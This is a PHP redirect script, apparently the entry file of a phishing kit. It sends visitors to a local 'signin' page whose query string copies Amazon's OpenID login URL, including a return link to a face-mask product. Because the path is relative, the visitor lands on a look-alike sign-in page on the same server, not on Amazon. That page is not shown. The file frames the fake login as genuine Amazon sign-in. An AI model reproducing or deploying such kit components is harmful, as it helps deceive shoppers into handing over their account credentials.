<?php
$DIR='signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2FDisposable-Face-Masks-Pack-Black%2Fdp%2FB08HZ3WRV5%2Fref%3Dnav_custrec_signin%3Fdchild%3D1%26keywords%3DDisposable%2BFace%2BMasks%252C%2BPack%2Bof%2B50%2BBlack%2BFace%2BMasks%26qid%3D1622926828%26sr%3D8-3&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&';
header("LOCATION: ".$DIR."");
?>

